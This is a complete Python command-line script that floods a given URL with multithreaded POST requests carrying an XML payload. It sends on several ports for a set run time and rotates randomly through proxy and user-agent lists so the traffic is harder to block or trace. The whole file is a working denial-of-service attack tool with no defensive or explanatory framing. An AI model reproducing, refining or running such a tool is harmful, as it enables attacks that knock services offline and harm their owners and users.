import concurrent.futures
import requests
import time
import argparse
import random

def read_file(file_name):
    with open(file_name, 'r') as f:
        return f.read()

def get_proxies(file_name):
    proxies = read_file(file_name)
    proxies = proxies.split('\n')
    proxies = list(filter(lambda x: x != '', proxies))
    return proxies

def get_useragents(file_name):
    useragents = read_file(file_name)
    useragents = useragents.split('\n')
    useragents = list(filter(lambda x: x != '', useragents))
    return useragents

def send_request(url, payload, proxy, useragent, port):
    session = requests.Session()
    session.proxies = {'http': proxy, 'https': proxy}
    headers = {'Content-Type': 'application/xml', 'User-Agent': useragent, 'Referer': 'objective'}
    try:
        if port == 443:
            response = session.post(url, data=payload, headers=headers, timeout=5, verify=False)
        else:
            response = session.post(f"{url}:{port}", data=payload, headers=headers, timeout=5, verify=False)
        print(response)
    except Exception as e:
        print(str(e))

def main(url, run_time, num_threads):
    proxies = get_proxies('http.txt')
    useragents = get_useragents('ua.txt')
    data = read_file('data.xml')
    threads_finished = 0
    start_time = time.time()

    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        while time.time() - start_time < run_time:
            proxy = random.choice(proxies)
            useragent = random.choice(useragents)
            port_list = [443, 80, 8080, 8000, 53]
            futures = []

            for port in port_list:
                futures.append(executor.submit(send_request, url, data, proxy, useragent, port))
                threads_finished += 1

            # Wait for all requests to complete their timeout or finish
            concurrent.futures.wait(futures, timeout=5)

    print(f'Finished {threads_finished} threads.') 

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', required=True)
    parser.add_argument('--run_time', required=True)
    parser.add_argument('--num_threads', required=True)

    args = parser.parse_args()
    main(args.url, int(args.run_time), int(args.num_threads))
